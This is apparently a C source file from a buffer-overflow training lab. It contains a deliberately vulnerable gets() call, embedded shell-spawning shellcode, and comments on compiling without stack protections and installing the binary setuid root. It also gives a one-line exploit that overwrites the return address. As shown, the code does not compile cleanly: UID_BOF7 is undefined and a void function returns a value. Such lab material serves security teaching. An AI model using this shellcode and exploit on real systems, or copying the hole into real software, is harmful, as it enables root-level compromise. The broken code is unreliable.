// AFTER => bof5.c
//       => shellcode.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128

// ASLR OFF
// COMPILE $ gcc -z execstack -fno-stack-protector bof6.c -o bof6
// SETUID  $ sudo chown root:root bof6
//         $ sudo chmod 4755 bof6
// EXPLOIT $ (python -c "print 'x'*136+'\x10\x50\x75\x55\x55\x55\x00\x00'";cat) | ./bof6

char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

void vuln() {
    char buf[BUF_SIZE];

    printf("[shellcode:%p]\n", shellcode);
    gets(buf);
    printf("Hello %s!\n", buf);

    if (setreuid(UID_BOF7, UID_BOF7)) {
        perror("setuid");
        return 1;
    }
    if (setregid(UID_BOF7, UID_BOF7)) {
        perror("setgid");
        return 1;
    }
}

int main() {
    vuln();
    return 0;
}
